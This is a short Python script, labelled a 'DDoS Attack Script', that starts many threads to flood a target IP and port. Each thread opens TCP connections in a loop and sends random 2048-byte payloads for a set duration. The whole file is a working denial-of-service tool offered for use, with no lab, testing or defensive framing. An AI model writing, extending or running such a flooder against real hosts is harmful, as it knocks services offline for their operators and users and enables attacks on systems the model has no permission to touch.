#!/usr/bin/python3

import argparse
import socket
import threading
import random
import time

class DDoS:
    def __init__(self, ip, port, duration):
        self.target = ip
        self.port = port
        self.duration = duration
        self.stop = False

    def attack(self):
        print(f"[*] Starting attack on {self.target}:{self.port} for {self.duration} seconds...")
        start_time = time.time()
        while not self.stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendto(random._urandom(2048), (self.target, self.port))
                s.sendto(random._urandom(2048), (self.target, self.port))
                s.sendto(random._urandom(2048), (self.target, self.port))
                s.sendto(random._urandom(2048), (self.target, self.port))
                s.sendto(random._urandom(2048), (self.target, self.port))
                s.close()
            except socket.error:
                print(f"[*] Server is down! Exiting...")
                break
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[*] Error: {str(e)}")

            # Check if the duration has elapsed
            if time.time() - start_time >= self.duration:
                break

    def stop_attack(self):
        self.stop = True

def parse_args():
    parser = argparse.ArgumentParser(description="DDoS Attack Script")
    parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
    parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
    parser.add_argument("--times", dest="times", type=int, required=True, help="Number of times to attack")
    parser.add_argument("--threads", dest="threads", type=int, required=True, help="Number of threads to use")
    parser.add_argument("--duration", dest="duration", type=int, required=True, help="Duration of attack in seconds")
    return parser.parse_args()

def main():
    args = parse_args()
    ip = args.ip
    port = args.port
    times = args.times
    threads = args.threads
    duration = args.duration

    ddos_threads = []

    for _ in range(threads):
        ddos = DDoS(ip, port, duration)
        ddos_thread = threading.Thread(target=ddos.attack)
        ddos_threads.append(ddos_thread)
        ddos_thread.start()

    for thread in ddos_threads:
        thread.join()

if __name__ == "__main__":
    main()
